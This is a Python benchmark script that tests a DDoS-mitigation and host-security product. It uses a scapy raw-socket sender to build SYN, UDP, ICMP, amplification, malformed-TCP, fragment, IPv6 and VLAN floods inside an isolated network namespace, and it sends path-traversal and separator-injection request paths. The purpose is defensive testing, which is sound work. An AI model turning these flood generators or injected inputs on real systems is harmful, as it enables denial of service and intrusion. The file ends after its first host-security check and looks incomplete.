#!/usr/bin/env python3
"""
Cyrenus End-to-End Security & Performance Benchmark Suite (0-100 Score)

Exercises dual-stack IPv4/IPv6 XDP packet mitigation over an isolated Linux veth
network namespace, Tetragon YAML write/deploy & correlation pipelines, control-plane
authentication/headers/WebSocket hardening, and dataplane/API latency & accuracy.
"""

import argparse
import base64
import hashlib
import http.client
import json
import os
import socket
import statistics
import struct
import subprocess
import sys
import tempfile
import time
from datetime import datetime, timezone
from typing import Any, Dict, List, Optional, Tuple
from urllib.parse import urlparse


# ---------------------------------------------------------------------------
# Fast Raw AF_PACKET Sender (executed inside attacker netns via --send-vector)
# ---------------------------------------------------------------------------

def send_vector_main(args: argparse.Namespace) -> int:
    try:
        from scapy.all import Ether, Dot1Q, IP, IPv6, TCP, UDP, ICMP, ICMPv6EchoRequest, ICMPv6ND_NS, Raw  # type: ignore
    except ImportError as exc:
        sys.stderr.write(f"ERROR: scapy is required inside netns sender: {exc}\n")
        return 2

    spec = json.loads(args.spec)
    iface = spec["iface"]
    mac_src = spec["mac_src"]
    mac_dst = spec["mac_dst"]
    kind = spec["kind"]
    count = int(spec.get("count", 1))
    delay_us = float(spec.get("delay_us", 0))
    vlan_id = spec.get("vlan_id")

    src_ip = spec.get("src_ip", "10.200.0.10")
    dst_ip = spec.get("dst_ip", "10.200.0.1")
    sport = int(spec.get("sport", 40000))
    dport = int(spec.get("dport", 80))

    def wrap_l2(l3_pkt: Any) -> Any:
        eth = Ether(src=mac_src, dst=mac_dst)
        if vlan_id is not None:
            return eth / Dot1Q(vlan=int(vlan_id)) / l3_pkt
        return eth / l3_pkt

    pkts: List[bytes] = []

    if kind == "syn_v4":
        for i in range(count):
            p = wrap_l2(IP(src=src_ip, dst=dst_ip, ttl=64) / TCP(sport=sport + (i % 1000), dport=dport, flags="S", seq=1000 + i))
            pkts.append(bytes(p))
    elif kind == "udp_v4":
        payload = Raw(b"CYRENUS_UDP_FLOOD_" * 2)
        template = bytes(wrap_l2(IP(src=src_ip, dst=dst_ip, ttl=64) / UDP(sport=sport, dport=dport) / payload))
        pkts = [template] * count
    elif kind == "icmp_v4":
        template = bytes(wrap_l2(IP(src=src_ip, dst=dst_ip, ttl=64) / ICMP(type=8, code=0, id=1234, seq=1) / Raw(b"PING" * 4)))
        pkts = [template] * count
    elif kind == "dns_amp_v4":
        # First oversized DNS response triggers immediate max_dns_response_size check,
        # plus rapid burst triggering dns_amp_rate.
        big = bytes(wrap_l2(IP(src=src_ip, dst=dst_ip, ttl=64) / UDP(sport=53, dport=45000) / Raw(b"D" * 700)))
        pkts.append(big)
        small = bytes(wrap_l2(IP(src=src_ip, dst=dst_ip, ttl=64) / UDP(sport=53, dport=45000) / Raw(b"D" * 100)))
        pkts.extend([small] * max(0, count - 1))
    elif kind == "udp_amp_v4":
        # NTP monlist / Memcached / SSDP multi-port amplification
        ntp_big = bytes(wrap_l2(IP(src=src_ip, dst=dst_ip, ttl=64) / UDP(sport=123, dport=45001) / Raw(b"N" * 1100)))
        pkts.append(ntp_big)
        memcached_burst = bytes(wrap_l2(IP(src=src_ip, dst=dst_ip, ttl=64) / UDP(sport=11211, dport=45002) / Raw(b"M" * 200)))
        pkts.extend([memcached_burst] * max(0, count - 1))
    elif kind == "ack_v4":
        template = bytes(wrap_l2(IP(src=src_ip, dst=dst_ip, ttl=64) / TCP(sport=sport, dport=dport, flags="A", seq=100, ack=200)))
        pkts = [template] * count
    elif kind == "rst_v4":
        template = bytes(wrap_l2(IP(src=src_ip, dst=dst_ip, ttl=64) / TCP(sport=sport, dport=dport, flags="R", seq=100)))
        pkts = [template] * count
    elif kind == "synack_v4":
        template = bytes(wrap_l2(IP(src=src_ip, dst=dst_ip, ttl=64) / TCP(sport=sport, dport=dport, flags="SA", seq=100, ack=200)))
        pkts = [template] * count
    elif kind == "malformed_tcp_v4":
        variants = [
            bytes(wrap_l2(IP(src=src_ip, dst=dst_ip, ttl=64) / TCP(sport=sport, dport=dport, flags=""))),     # NULL
            bytes(wrap_l2(IP(src=src_ip, dst=dst_ip, ttl=64) / TCP(sport=sport, dport=dport, flags="FPU"))),  # Un-ACKed Xmas
            bytes(wrap_l2(IP(src=src_ip, dst=dst_ip, ttl=64) / TCP(sport=sport, dport=dport, flags="SF"))),   # SYN+FIN
            bytes(wrap_l2(IP(src=src_ip, dst=dst_ip, ttl=64) / TCP(sport=sport, dport=dport, flags="SR"))),   # SYN+RST
        ]
        for i in range(count):
            pkts.append(variants[i % len(variants)])
    elif kind == "frag_v4":
        # Fragment offset = 1 (8 bytes) triggers immediate TINY/OVERLAP fragment drop
        template = bytes(wrap_l2(IP(src=src_ip, dst=dst_ip, ttl=64, flags="MF", frag=1, proto=17) / Raw(b"F" * 40)))
        pkts = [template] * count
    elif kind == "rule_tcp_v4":
        template = bytes(wrap_l2(IP(src=src_ip, dst=dst_ip, ttl=64) / TCP(sport=sport, dport=dport, flags="S", seq=1)))
        pkts = [template] * count
    elif kind == "syn_v6":
        for i in range(count):
            p = wrap_l2(IPv6(src=src_ip, dst=dst_ip, hlim=64) / TCP(sport=sport + (i % 1000), dport=dport, flags="S", seq=2000 + i))
            pkts.append(bytes(p))
    elif kind == "rule_udp_v6":
        template = bytes(wrap_l2(IPv6(src=src_ip, dst=dst_ip, hlim=64) / UDP(sport=sport, dport=dport) / Raw(b"V6DROP")))
        pkts = [template] * count
    elif kind == "ndp_v6":
        template = bytes(wrap_l2(IPv6(src=src_ip, dst=dst_ip, hlim=255) / ICMPv6ND_NS(tgt=dst_ip)))
        pkts = [template] * count
    elif kind == "clean_mixed":
        # Clean TCP handshake (SYN then ACK on exact same tuple) + low-rate UDP + ICMPv6/UDP IPv6
        v4_clean_src = src_ip
        v4_dst = dst_ip
        v6_clean_src = spec.get("src_ip6", "fd00:200::50")
        v6_dst = spec.get("dst_ip6", "fd00:200::1")
        # TCP SYN followed by 15 legitimate ACK packets (allowed by connection tracking)
        pkts.append(bytes(wrap_l2(IP(src=v4_clean_src, dst=v4_dst, ttl=64) / TCP(sport=44444, dport=443, flags="S", seq=1))))
        ack_pkt = bytes(wrap_l2(IP(src=v4_clean_src, dst=v4_dst, ttl=64) / TCP(sport=44444, dport=443, flags="PA", seq=2, ack=2) / Raw(b"GET / HTTP/1.1\r\n\r\n")))
        pkts.extend([ack_pkt] * 15)
        udp_clean = bytes(wrap_l2(IP(src=v4_clean_src, dst=v4_dst, ttl=64) / UDP(sport=51000, dport=51000) / Raw(b"CLEAN_UDP")))
        pkts.extend([udp_clean] * 30)
        udp6_clean = bytes(wrap_l2(IPv6(src=v6_clean_src, dst=v6_dst, hlim=64) / UDP(sport=51001, dport=51001) / Raw(b"CLEAN_V6")))
        pkts.extend([udp6_clean] * 20)
        icmp6_echo = bytes(wrap_l2(IPv6(src=v6_clean_src, dst=v6_dst, hlim=64) / ICMPv6EchoRequest(data=b"PING6")))
        pkts.extend([icmp6_echo] * 10)
    else:
        sys.stderr.write(f"ERROR: unknown vector kind '{kind}'\n")
        return 2

    sock = socket.socket(socket.AF_PACKET, socket.SOCK_RAW)
    sock.bind((iface, 0))
    delay_sec = delay_us / 1_000_000.0
    sent = 0
    try:
        for frame in pkts:
            retries = 0
            while True:
                try:
                    sock.send(frame)
                    sent += 1
                    break
                except OSError:
                    retries += 1
                    if retries > 20:
                        break
                    time.sleep(0.002)
            if delay_sec > 0:
                time.sleep(delay_sec)
    finally:
        sock.close()

    print(json.dumps({"sent": sent}))
    return 0


# ---------------------------------------------------------------------------
# HTTP / Auth / RFC-6455 WebSocket Client Helpers
# ---------------------------------------------------------------------------

class CyrenusClient:
    def __init__(self, base_url: str):
        parsed = urlparse(base_url)
        self.host = parsed.hostname or "127.0.0.1"
        self.port = parsed.port or (443 if parsed.scheme == "https" else 80)
        self.token: Optional[str] = None

    def request(
        self,
        method: str,
        path: str,
        body: Optional[Any] = None,
        headers: Optional[Dict[str, str]] = None,
        auth: bool = True,
        source_ip: Optional[str] = None,
    ) -> Tuple[int, Dict[str, str], str]:
        hdrs: Dict[str, str] = {}
        if headers:
            hdrs.update(headers)
        if auth and self.token and "Authorization" not in hdrs:
            hdrs["Authorization"] = f"Bearer {self.token}"

        raw_body: Optional[bytes] = None
        if body is not None:
            if isinstance(body, (dict, list)):
                raw_body = json.dumps(body).encode("utf-8")
                hdrs.setdefault("Content-Type", "application/json")
            elif isinstance(body, str):
                raw_body = body.encode("utf-8")
            else:
                raw_body = body

        src_addr = (source_ip, 0) if source_ip else None
        conn = http.client.HTTPConnection(self.host, self.port, timeout=5.0, source_address=src_addr)
        try:
            conn.request(method, path, body=raw_body, headers=hdrs)
            resp = conn.getresponse()
            data = resp.read().decode("utf-8", errors="replace")
            resp_headers = {k.lower(): v for k, v in resp.getheaders()}
            return resp.status, resp_headers, data
        finally:
            conn.close()

    def login(self, username: str, password: str) -> str:
        status, _, body = self.request(
            "POST",
            "/api/v1/auth/login",
            body={"username": username, "password": password},
            auth=False,
        )
        if status != 200:
            raise RuntimeError(f"Admin login failed (HTTP {status}): {body}")
        data = json.loads(body)
        self.token = data["token"]
        return self.token

    def get_json(self, path: str) -> Any:
        status, _, body = self.request("GET", path)
        if status != 200:
            raise RuntimeError(f"GET {path} failed HTTP {status}: {body}")
        return json.loads(body)

    def post_json(self, path: str, payload: Any) -> Tuple[int, Any]:
        status, _, body = self.request("POST", path, body=payload)
        try:
            return status, json.loads(body)
        except Exception:
            return status, body


def ws_connect_and_read(host: str, port: int, path: str, protocol: str = "lws-cyrenus-protocol", timeout_sec: float = 3.0) -> Tuple[int, str, List[str]]:
    """Minimal RFC 6455 client verifying WS auth upgrade & reading JSON frames."""
    sock = socket.create_connection((host, port), timeout=timeout_sec)
    try:
        ws_key = base64.b64encode(os.urandom(16)).decode("ascii")
        req = (
            f"GET {path} HTTP/1.1\r\n"
            f"Host: {host}:{port}\r\n"
            f"Upgrade: websocket\r\n"
            f"Connection: Upgrade\r\n"
            f"Sec-WebSocket-Key: {ws_key}\r\n"
            f"Sec-WebSocket-Version: 13\r\n"
            f"Sec-WebSocket-Protocol: {protocol}\r\n"
            f"\r\n"
        )
        sock.sendall(req.encode("ascii"))

        buf = b""
        while b"\r\n\r\n" not in buf:
            chunk = sock.recv(4096)
            if not chunk:
                break
            buf += chunk

        if not buf:
            return 0, "", []

        hdr_end = buf.find(b"\r\n\r\n")
        hdr_text = buf[:hdr_end].decode("latin-1", errors="replace") if hdr_end != -1 else buf.decode("latin-1", errors="replace")
        rest = buf[hdr_end + 4:] if hdr_end != -1 else b""

        status_line = hdr_text.splitlines()[0] if hdr_text else ""
        parts = status_line.split()
        status_code = int(parts[1]) if len(parts) >= 2 and parts[1].isdigit() else 0

        if status_code != 101:
            return status_code, hdr_text, []

        expected_accept = base64.b64encode(
            hashlib.sha1((ws_key + "258EAFA5-E914-47DA-95CA-C5AB0DC85B11").encode("ascii")).digest()
        ).decode("ascii")
        if expected_accept not in hdr_text:
            return 0, hdr_text, []

        messages: List[str] = []
        deadline = time.time() + timeout_sec
        sock.settimeout(0.5)
        frame_buf = bytearray(rest)
        while time.time() < deadline and len(messages) < 5:
            if len(frame_buf) < 2:
                try:
                    chunk = sock.recv(4096)
                    if not chunk:
                        break
                    frame_buf.extend(chunk)
                    continue
                except socket.timeout:
                    continue

            b1, b2 = frame_buf[0], frame_buf[1]
            opcode = b1 & 0x0F
            masked = (b2 & 0x80) != 0
            plen = b2 & 0x7F
            idx = 2
            if plen == 126:
                if len(frame_buf) < idx + 2:
                    chunk = sock.recv(4096)
                    if not chunk:
                        break
                    frame_buf.extend(chunk)
                    continue
                plen = struct.unpack("!H", frame_buf[idx:idx + 2])[0]
                idx += 2
            elif plen == 127:
                if len(frame_buf) < idx + 8:
                    chunk = sock.recv(4096)
                    if not chunk:
                        break
                    frame_buf.extend(chunk)
                    continue
                plen = struct.unpack("!Q", frame_buf[idx:idx + 8])[0]
                idx += 8

            need = idx + (4 if masked else 0) + plen
            while len(frame_buf) < need:
                try:
                    chunk = sock.recv(4096)
                    if not chunk:
                        break
                    frame_buf.extend(chunk)
                except socket.timeout:
                    break
            if len(frame_buf) < need:
                break

            if masked:
                mask_key = frame_buf[idx:idx + 4]
                idx += 4
                payload = bytes(frame_buf[idx + i] ^ mask_key[i % 4] for i in range(plen))
            else:
                payload = bytes(frame_buf[idx:idx + plen])
            del frame_buf[:need]

            if opcode == 0x8:  # Close
                break
            elif opcode in (0x1, 0x2):
                messages.append(payload.decode("utf-8", errors="replace"))

        return status_code, hdr_text, messages
    finally:
        sock.close()


# ---------------------------------------------------------------------------
# Benchmark Orchestrator
# ---------------------------------------------------------------------------

class CheckResult:
    def __init__(self, check_id: str, category: str, name: str, max_pts: float):
        self.check_id = check_id
        self.category = category
        self.name = name
        self.max_pts = float(max_pts)
        self.earned_pts = 0.0
        self.passed = False
        self.detail = ""

    def set(self, passed: bool, detail: str, partial_pts: Optional[float] = None) -> None:
        self.passed = passed
        self.detail = detail
        if partial_pts is not None:
            self.earned_pts = max(0.0, min(self.max_pts, float(partial_pts)))
        else:
            self.earned_pts = self.max_pts if passed else 0.0

    def to_dict(self) -> Dict[str, Any]:
        return {
            "id": self.check_id,
            "category": self.category,
            "name": self.name,
            "passed": self.passed,
            "earned_points": round(self.earned_pts, 2),
            "max_points": round(self.max_pts, 2),
            "detail": self.detail,
        }


def run_netns_burst(args: argparse.Namespace, kind: str, **kwargs: Any) -> int:
    spec = {
        "iface": args.att_iface,
        "mac_src": args.mac_att,
        "mac_dst": args.mac_host,
        "kind": kind,
        "dst_ip": args.host_ip,
    }
    spec.update(kwargs)
    cmd = [
        "ip", "netns", "exec", args.netns,
        sys.executable, os.path.abspath(__file__),
        "--send-vector", "--spec", json.dumps(spec),
    ]
    res = subprocess.run(cmd, capture_output=True, text=True, check=False)
    if res.returncode != 0:
        raise RuntimeError(f"netns burst '{kind}' failed: {res.stderr.strip()}")
    try:
        out = json.loads(res.stdout.strip().splitlines()[-1])
        return int(out.get("sent", 0))
    except Exception:
        return int(kwargs.get("count", 0))


def get_global_stats(client: CyrenusClient) -> Dict[str, int]:
    st = client.get_json("/api/v1/system/stats")
    gs = st.get("global_stats", {})
    return {k: int(v) for k, v in gs.items() if isinstance(v, (int, float))}


def stats_delta(before: Dict[str, int], after: Dict[str, int], key: str) -> int:
    return max(0, int(after.get(key, 0)) - int(before.get(key, 0)))


def wait_for_attack_in_db(client: CyrenusClient, search_ip: str, timeout_sec: float = 4.0) -> Optional[Dict[str, Any]]:
    deadline = time.time() + timeout_sec
    while time.time() < deadline:
        res = client.get_json(f"/api/v1/attacks?search={search_ip}&limit=20")
        attacks = res.get("attacks", []) if isinstance(res, dict) else res
        for atk in attacks:
            if atk.get("src_ip") == search_ip:
                return atk
        time.sleep(0.35)
    return None


def main_benchmark(args: argparse.Namespace) -> int:
    client = CyrenusClient(args.url)
    checks: List[CheckResult] = []
    use_color = not args.no_color and sys.stdout.isatty()

    GREEN = "\033[0;32m" if use_color else ""
    RED = "\033[0;31m" if use_color else ""
    YELLOW = "\033[1;33m" if use_color else ""
    CYAN = "\033[0;36m" if use_color else ""
    BOLD = "\033[1m" if use_color else ""
    NC = "\033[0m" if use_color else ""

    def log(msg: str) -> None:
        print(msg, flush=True)

    # Authenticate cleanly as admin before any brute-force / XDP checks
    client.login(args.username, args.password)
    sys_info = client.get_json("/api/v1/system/stats")
    ws_port = int(sys_info.get("ws_port", args.ws_port))
    parsed_url = urlparse(args.url)
    api_host = parsed_url.hostname or "127.0.0.1"
    api_port = parsed_url.port or 8181

    log(f"{BOLD}{CYAN}=== Cyrenus Security & Performance Benchmark Suite ==={NC}")
    log(f"Target API: {args.url} | WS Port: {ws_port} | Interface: {sys_info.get('interface')} ({sys_info.get('xdp_mode')})\n")

    # Apply calibrated benchmark thresholds so burst tests finish deterministically & fast
    if not args.skip_xdp:
        calib_payload = {
            "syn_flood_rate": 100,
            "synack_flood_rate": 100,
            "rst_flood_rate": 100,
            "ack_flood_rate": 150,
            "udp_flood_rate": 150,
            "icmp_flood_rate": 50,
            "dns_amp_rate": 50,
            "max_frags": 10,
            "auto_block_enabled": True,
            "auto_block_duration_sec": 120,
            "global_syn_rate": 3000,
            "global_udp_rate": 5000,
            "max_dns_response_size": 512,
        }
        code, _ = client.post_json("/api/v1/system/settings", calib_payload)
        if code != 200:
            raise RuntimeError(f"Failed to configure benchmark thresholds: HTTP {code}")
        time.sleep(0.2)

    # =======================================================================
    # CATEGORY A: Network L3/L4 XDP Mitigation (55 pts)
    # =======================================================================
    if not args.skip_xdp:
        # A1: SYN Flood (5 pts)
        c = CheckResult("A1", "Network L3/L4 XDP", "IPv4 TCP SYN Flood & Auto-Block", 5.0)
        b = get_global_stats(client)
        sent = run_netns_burst(args, "syn_v4", src_ip="10.200.0.10", count=600, delay_us=300)
        a = get_global_stats(client)
        syn_d = stats_delta(b, a, "syn_drops")
        ab_d = stats_delta(b, a, "autoblock_drops")
        tot_d = syn_d + ab_d
        blks = client.get_json("/api/v1/blocks").get("blocks", [])
        blk_hit = any(x.get("ip") == "10.200.0.10" for x in blks)
        ok = (syn_d >= 1 and tot_d >= int(sent * 0.6) and blk_hit)
        c.set(ok, f"sent={sent}, syn_drops={syn_d}, autoblock_drops={ab_d}, blocked={blk_hit}")
        checks.append(c)

        # A2: UDP Flood (5 pts)
        c = CheckResult("A2", "Network L3/L4 XDP", "IPv4 UDP Flood Mitigation", 5.0)
        b = get_global_stats(client)
        sent = run_netns_burst(args, "udp_v4", src_ip="10.200.0.11", dport=9999, count=700, delay_us=250)
        a = get_global_stats(client)
        udp_d = stats_delta(b, a, "udp_drops")
        ab_d = stats_delta(b, a, "autoblock_drops")
        tot_d = udp_d + ab_d
        blks = client.get_json("/api/v1/blocks").get("blocks", [])
        blk_hit = any(x.get("ip") == "10.200.0.11" for x in blks)
        c.set(udp_d >= 1 and tot_d >= int(sent * 0.6) and blk_hit,
              f"sent={sent}, udp_drops={udp_d}, autoblock_drops={ab_d}, blocked={blk_hit}")
        checks.append(c)

        # A3: ICMP Flood (5 pts)
        c = CheckResult("A3", "Network L3/L4 XDP", "IPv4 ICMP Token-Bucket Flood Mitigation", 5.0)
        b = get_global_stats(client)
        sent = run_netns_burst(args, "icmp_v4", src_ip="10.200.0.12", count=300, delay_us=300)
        a = get_global_stats(client)
        icmp_d = stats_delta(b, a, "icmp_drops")
        ab_d = stats_delta(b, a, "autoblock_drops")
        tot_d = icmp_d + ab_d
        c.set(icmp_d >= 1 and tot_d >= int(sent * 0.6),
              f"sent={sent}, icmp_drops={icmp_d}, autoblock_drops={ab_d}")
        checks.append(c)

        # A4: DNS + Multi-Port UDP Amplification (5 pts)
        c = CheckResult("A4", "Network L3/L4 XDP", "DNS & Multi-Port UDP Amplification (NTP/Memcached)", 5.0)
        b = get_global_stats(client)
        s_dns = run_netns_burst(args, "dns_amp_v4", src_ip="10.200.0.13", count=150, delay_us=200)
        s_amp = run_netns_burst(args, "udp_amp_v4", src_ip="10.200.0.14", count=150, delay_us=200)
        a = get_global_stats(client)
        dns_d = stats_delta(b, a, "dns_drops")
        amp_d = stats_delta(b, a, "amp_drops")
        ab_d = stats_delta(b, a, "autoblock_drops")
        c.set(dns_d >= 1 and amp_d >= 1 and (dns_d + amp_d + ab_d) >= 200,
              f"sent={s_dns + s_amp}, dns_drops={dns_d}, amp_drops={amp_d}, autoblock_drops={ab_d}")
        checks.append(c)

        # A5: Blind TCP ACK Flood, RST Flood & SYN-ACK Reflection (6 pts)
        c = CheckResult("A5", "Network L3/L4 XDP", "Blind TCP ACK Flood, RST Flood & SYN-ACK Reflection", 6.0)
        b = get_global_stats(client)
        s_ack = run_netns_burst(args, "ack_v4", src_ip="10.200.0.15", dport=80, count=450, delay_us=250)
        s_rst = run_netns_burst(args, "rst_v4", src_ip="10.200.0.16", dport=80, count=350, delay_us=250)
        s_synack = run_netns_burst(args, "synack_v4", src_ip="10.200.0.17", dport=80, count=350, delay_us=250)
        a = get_global_stats(client)
        ack_d = stats_delta(b, a, "ack_drops")
        rst_d = stats_delta(b, a, "rst_drops")
        syn_d = stats_delta(b, a, "syn_drops")
        ab_d = stats_delta(b, a, "autoblock_drops")
        time.sleep(1.3)
        blks = client.get_json("/api/v1/blocks").get("blocks", [])
        blk_ips = {x.get("ip"): x.get("attack_type") for x in blks}
        synack_ok = blk_ips.get("10.200.0.17") == "SYN-ACK Reflection" and syn_d >= 1
        part = (2.0 if ack_d >= 1 else 0.0) + (2.0 if rst_d >= 1 else 0.0) + (2.0 if synack_ok else 0.0)
        c.set(part == 6.0,
              f"ack_drops={ack_d}/{s_ack}, rst_drops={rst_d}/{s_rst}, synack_syn_drops={syn_d}, synack_blk={blk_ips.get('10.200.0.17')}, autoblock={ab_d}",
              partial_pts=part)
        checks.append(c)

        # A6: Malformed TCP & Fragmentation Attacks (6 pts)
        c = CheckResult("A6", "Network L3/L4 XDP", "Malformed TCP (NULL/Xmas/SF/SR) & Fragmentation Drops", 6.0)
        b = get_global_stats(client)
        s_mal = run_netns_burst(args, "malformed_tcp_v4", src_ip="10.200.0.18", count=20, delay_us=500)
        s_frag = run_netns_burst(args, "frag_v4", src_ip="10.200.0.19", count=25, delay_us=500)
        a = get_global_stats(client)
        mal_d = stats_delta(b, a, "malformed_drops")
        frag_d = stats_delta(b, a, "frag_drops")
        ab_d = stats_delta(b, a, "autoblock_drops")
        mal_ok = (mal_d == s_mal)
        frag_ok = (frag_d >= 1 and (frag_d + ab_d) >= s_frag)
        part = (3.0 if mal_ok else 0.0) + (3.0 if frag_ok else 0.0)
        c.set(mal_ok and frag_ok,
              f"malformed_drops={mal_d}/{s_mal}, frag_drops={frag_d}, total_frag_mitigated={frag_d + ab_d}/{s_frag}",
              partial_pts=part)
        checks.append(c)

        # A7: Explicit Firewall Rule + CIDR LPM Blacklist (5 pts)
        c = CheckResult("A7", "Network L3/L4 XDP", "Explicit Firewall Rules & CIDR LPM Blacklist Enforcement", 5.0)
        r_code, _ = client.post_json("/api/v1/rules", {"ip": "10.200.0.20", "port": 8080, "proto": "tcp", "action": "drop", "description": "bench drop"})
        bl_code, bl_resp = client.post_json("/api/v1/iplists", {"ip_address": "10.200.1.0", "cidr_range": 24, "list_type": "blacklist", "reason": "bench bl", "ttl_sec": 0})
        b = get_global_stats(client)
        s1 = run_netns_burst(args, "rule_tcp_v4", src_ip="10.200.0.20", dport=8080, count=20, delay_us=300)
        s2 = run_netns_burst(args, "udp_v4", src_ip="10.200.1.42", dport=9000, count=20, delay_us=300)
        a = get_global_stats(client)
        rule_d = stats_delta(b, a, "rule_drops")
        client.request("DELETE", "/api/v1/rules/10.200.0.20_8080_6")
        if isinstance(bl_resp, dict) and bl_resp.get("id"):
            client.request("DELETE", f"/api/v1/iplists/{bl_resp['id']}")
        c.set(r_code == 200 and bl_code == 200 and rule_d == (s1 + s2),
              f"rule_drops={rule_d}/{s1 + s2} (rule_api={r_code}, bl_api={bl_code})")
        checks.append(c)

        # A8: IPv6 Dual-Stack Flood + Explicit Rule + ICMPv6 NDP Exemption (6 pts)
        c = CheckResult("A8", "Network L3/L4 XDP", "IPv6 Flood Mitigation, IPv6 Rule Drop & NDP (133-136) Exemption", 6.0)
        r6_code, _ = client.post_json("/api/v1/rules", {"ip": "fd00:200::20", "port": 9001, "proto": "udp", "action": "drop", "description": "bench v6 drop"})
        b = get_global_stats(client)
        s6_syn = run_netns_burst(args, "syn_v6", src_ip="fd00:200::10", dst_ip=args.host_ipv6, dport=80, count=450, delay_us=300)
        s6_rule = run_netns_burst(args, "rule_udp_v6", src_ip="fd00:200::20", dst_ip=args.host_ipv6, dport=9001, count=15, delay_us=300)
        # Send NDP Neighbor Solicitation FROM already-auto-blocked fd00:200::10 -> MUST PASS!
        b_ndp = get_global_stats(client)
        s6_ndp = run_netns_burst(args, "ndp_v6", src_ip="fd00:200::10", dst_ip=args.host_ipv6, count=5, delay_us=500)
        a = get_global_stats(client)
        syn6_d = stats_delta(b, b_ndp, "syn_drops")
        ab6_d = stats_delta(b, b_ndp, "autoblock_drops")
        rule6_d = stats_delta(b, b_ndp, "rule_drops")
        ndp_passed = stats_delta(b_ndp, a, "passed_packets")
        ndp_dropped = stats_delta(b_ndp, a, "dropped_packets")
        client.request("DELETE", "/api/v1/rules/fd00%3A200%3A%3A20_9001_17")
        blks = client.get_json("/api/v1/blocks").get("blocks", [])
        v6_blocked = any(x.get("ip") == "fd00:200::10" for x in blks)
        ok = (r6_code == 200 and syn6_d >= 1 and (syn6_d + ab6_d) >= int(s6_syn * 0.6) and
              rule6_d == s6_rule and v6_blocked and ndp_passed >= s6_ndp and ndp_dropped == 0)
        c.set(ok, f"v6_syn={syn6_d}+{ab6_d}/{s6_syn}, v6_rule={rule6_d}/{s6_rule}, v6_blocked={v6_blocked}, ndp_pass={ndp_passed}/{s6_ndp} (drops={ndp_dropped})")
        checks.append(c)

        # A9: VLAN 802.1Q Tagged Flood Peeling (6 pts)
        c = CheckResult("A9", "Network L3/L4 XDP", "802.1Q VLAN Tag Peeling & Flood Mitigation", 6.0)
        b = get_global_stats(client)
        s_vlan = run_netns_burst(args, "udp_v4", vlan_id=100, src_ip="10.201.0.10", dst_ip=args.host_vlan_ip, dport=5555, count=450, delay_us=250)
        a = get_global_stats(client)
        vlan_udp_d = stats_delta(b, a, "udp_drops")
        vlan_ab_d = stats_delta(b, a, "autoblock_drops")
        blks = client.get_json("/api/v1/blocks").get("blocks", [])
        vlan_blocked = any(x.get("ip") == "10.201.0.10" for x in blks)
        c.set(vlan_udp_d >= 1 and (vlan_udp_d + vlan_ab_d) >= int(s_vlan * 0.6) and vlan_blocked,
              f"sent={s_vlan} (VLAN 100), udp_drops={vlan_udp_d}, autoblock_drops={vlan_ab_d}, blocked={vlan_blocked}")
        checks.append(c)

        # A10: Clean Traffic 0% False-Positive Rate & Whitelist Bypass (6 pts)
        c = CheckResult("A10", "Network L3/L4 XDP", "Clean Dual-Stack Traffic (0% FPR) & Whitelist Rate Bypass", 6.0)
        wl_code, wl_resp = client.post_json("/api/v1/iplists", {"ip_address": "10.200.0.51", "cidr_range": 32, "list_type": "whitelist", "reason": "bench trusted", "ttl_sec": 0})
        time.sleep(0.15)
        b = get_global_stats(client)
        s_clean = run_netns_burst(args, "clean_mixed", src_ip="10.200.0.50", dst_ip=args.host_ip, src_ip6="fd00:200::50", dst_ip6=args.host_ipv6, delay_us=12000)
        # Whitelisted source blasts above flood threshold and must still incur 0 drops
        s_wl = run_netns_burst(args, "udp_v4", src_ip="10.200.0.51", dport=52000, count=300, delay_us=200)
        a = get_global_stats(client)
        clean_pass = stats_delta(b, a, "passed_packets")
        clean_drop = stats_delta(b, a, "dropped_packets")
        flows = client.get_json("/api/v1/traffic/stats")
        has_v6_flow = any(f.get("ip_version") == 6 for f in flows)
        if isinstance(wl_resp, dict) and wl_resp.get("id"):
            client.request("DELETE", f"/api/v1/iplists/{wl_resp['id']}")
        total_clean = s_clean + s_wl
        c.set(wl_code == 200 and clean_drop == 0 and clean_pass >= total_clean and has_v6_flow,
              f"passed={clean_pass}/{total_clean}, false_drops={clean_drop}, v6_flow_tracked={has_v6_flow}")
        checks.append(c)

        # Ensure live SYN flood attack from 10.200.0.10 is persisted to DB before Category B correlation
        wait_for_attack_in_db(client, "10.200.0.10", timeout_sec=4.0)
    else:
        checks.append(CheckResult("A0", "Network L3/L4 XDP", "XDP checks skipped (--skip-xdp)", 55.0))
        checks[-1].set(False, "Skipped")

    # =======================================================================
    # CATEGORY B: Host Security & Tetragon Integration (20 pts)
    # =======================================================================
    # B1: Atomic LF Policy Write, Deploy, Config & Path Traversal Block (7 pts)
    c = CheckResult("B1", "Host Security (Tetragon)", "Atomic LF YAML Write/Deploy & Path-Traversal Defense", 7.0)
    st_trav1, _, _ = client.request("POST", "/api/v1/security/policy/..%2F..%2Fevil", body={"content": "bad"})
    st_trav2, _, _ = client.request("POST", "/api/v1/security/policy/bad;name", body={"content": "bad"})
    crlf_yaml = "apiVersion: cilium.io/v1alpha1\r\nkind: TracingPolicy\r\nmetadata:\r\n  name: \"bench-policy\"\r\nspec:\r\n  kprobes: []\r\n"
    st_save, _ = client.post_json("/api/v1/security/policy/bench-policy", {"content": crlf_yaml})
    st_deploy, _ = client.post_json("/api/v1/security/policy/bench-policy/deploy", {})
    pol_list = client.get_json("/api/v1/security/policies").get("policies", [])
    deployed_flag = any(p.get("name") == "bench-policy" and p.get("deployed") is True for p in pol_list)
    policy_src_path = os.path.join(args.policy_dir, "bench-policy.yaml")
    policy_dst_path = os.path.join(args.deployed_dir, "bench-policy.yaml")
    lf_clean = False
    if os.path.exists(policy_src_path) and os.path.exists(policy_dst_path):
        with open(policy_dst_path, "rb") as f:
            raw_bytes = f.read()
        lf_clean = (b"\r" not in raw_bytes) and (b"bench-policy" in raw_bytes)

    cfg_yaml = "enable-process-cred: true\r\nenable-process-ns: true\r\nexport-rate-limit: 5000\r\n"
    st_cfg_w, _ = client.post_json("/api/v1/security/config", {"content": cfg_yaml})
    cfg_read = client.get_json("/api/v1/security/config")
    cfg_lf = os.path.exists(args.tetragon_config) and ("\r" not in cfg_read.get("content", "")) and ("export-rate-limit: 5000" in cfg_read.get("content", ""))
    # Cleanup test policy after verification
    client.request("DELETE", "/api/v1/security/policy/bench-policy")
    ok = (st_trav1 == 400 and st_trav2 == 400 and st_save == 200 and st_deploy == 200 and
          deployed_flag and lf_clean and st_cfg_w == 200 and cfg_lf)
    c.set(ok, f"traversal=({st_trav1},{st_trav2}), save={st_save}, deploy={st_deploy}, deployed={deployed_flag}, lf={lf_clean}, cfg_lf={cfg_lf}")
    checks.append(c)

